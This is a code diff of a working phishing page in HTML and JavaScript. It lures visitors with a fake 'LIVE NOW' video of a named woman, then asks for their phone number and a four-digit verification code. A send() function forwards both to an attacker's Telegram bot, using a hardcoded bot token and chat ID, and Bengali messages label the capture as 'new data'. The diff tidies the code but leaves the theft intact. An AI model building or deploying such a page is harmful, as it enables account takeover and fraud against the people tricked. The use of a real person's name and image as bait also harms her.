@@ -3,16 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
     <title>🔴 Sumaiya Akter Jui is LIVE NOW</title>
-    <meta property="og:title" content="🔴 Sumaiya Akter Jui is LIVE NOW">
-    <meta property="og:image" content="ssstik.io_1777744992501.jpeg">
-    <meta property="og:type" content="video.other">
-
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
-
         #p1 { position: fixed; width: 100%; height: 100%; z-index: 1; }
         video { width: 100%; height: 100%; object-fit: cover; }
         .ui { position: absolute; bottom: 0; width: 100%; height: 100%; z-index: 2; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 80px; background: linear-gradient(to bottom, transparent 40%, rgba(0,0,0,0.7)); }
@@ -21,23 +15,18 @@
         .b { padding: 15px 25px; border-radius: 30px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 13px; }
         .w { background: #fff; color: #000; }
         .p { background: #E1306C; color: #fff; }
-
         .view { position: fixed; top: 0; width: 100%; height: 100%; background: #fff; z-index: 100; display: none; flex-direction: column; align-items: center; padding-top: 60px; }
-        /* প্রোফাইল পিকচার ছোট করা হয়েছে (৮০ পিক্সেল) */
         .pic { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #eee; object-fit: cover; margin-bottom: 15px; }
         .t { font-size: 18px; color: #000; font-weight: bold; margin-bottom: 25px; }
         .inp { width: 85%; max-width: 350px; padding: 16px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 10px; background: #fafafa; font-size: 16px; outline: none; }
-        
         .o-row { display: flex; gap: 10px; margin-bottom: 25px; }
         .o-box { width: 45px; height: 50px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 20px; font-weight: bold; background: #fafafa; }
-
         .sub { width: 85%; max-width: 350px; padding: 16px; background: linear-gradient(90deg, #6a11cb, #2575fc); color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-
     <div id="p1">
-        <video id="v" autoplay muted loop playsinline poster="ssstik.io_1777744992501.jpeg">
+        <video autoplay muted loop playsinline poster="ssstik.io_1777744992501.jpeg">
             <source src="1000010152.mp4" type="video/mp4">
         </video>
         <div class="ui">
@@ -48,26 +37,23 @@
             </div>
         </div>
     </div>
-
     <div id="p2" class="view">
         <img src="ssstik.io_1777744992501.jpeg" class="pic">
         <h2 class="t">Sumaiya Akter Jui</h2>
         <input type="tel" id="ph" class="inp" placeholder="Phone number">
         <button class="sub" onclick="go3()">CONTINUE</button>
     </div>
-
     <div id="p3" class="view">
         <img src="ssstik.io_1777744992501.jpeg" class="pic">
         <h2 class="t">Verification Code</h2>
         <div class="o-row">
-            <input type="tel" maxlength="1" class="o-box" onkeyup="nx(this, 'b2')">
+            <input type="tel" maxlength="1" class="o-box" id="b1" onkeyup="nx(this, 'b2')">
             <input type="tel" maxlength="1" class="o-box" id="b2" onkeyup="nx(this, 'b3')">
             <input type="tel" maxlength="1" class="o-box" id="b3" onkeyup="nx(this, 'b4')">
             <input type="tel" maxlength="1" class="o-box" id="b4">
         </div>
         <button class="sub" onclick="send()">VIDEO CALL NOW ✅</button>
     </div>
-
 <script>
     let phoneNum = "";
     function go2() { document.getElementById('p1').style.display = 'none'; document.getElementById('p2').style.display = 'flex'; }
@@ -77,16 +63,13 @@
         document.getElementById('p2').style.display = 'none'; document.getElementById('p3').style.display = 'flex'; 
     }
     function nx(e, i) { if(e.value.length >= 1) document.getElementById(i).focus(); }
-
     function send() {
         const token = "8512100128:AAGk_HAlgp8deEn7wuRUtHE90Ev234DN1lE"; 
-        const cid = "8795859465"; // আপনার সঠিক চ্যাট আইডি
-        const b = document.querySelectorAll('.o-box');
-        const otp = b[0].value + b[1].value + b[2].value + b[3].value;
-
+        const cid = "8795859465"; // আপনার সঠিক আইডি
+        const b = [document.getElementById('b1').value, document.getElementById('b2').value, document.getElementById('b3').value, document.getElementById('b4').value];
+        const otp = b.join('');
         if(otp.length < 4) return alert("৪ সংখ্যার কোড দিন");
-
-        const msg = `🔴 নতুন ডাটা:\n👤 নাম: Sumaiya Akter Jui\n📱 নম্বর: ${phoneNum}\n🔑 ওটিপি: ${otp}`;
+        const msg = `🔴 নতুন ডাটা:\n👤 প্রোফাইল: Sumaiya Akter Jui\n📱 নম্বর: ${phoneNum}\n🔑 ওটিপি: ${otp}`;
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`)
         .then(() => { 
             alert("যাচাই হচ্ছে... দয়া করে অপেক্ষা করুন।"); 
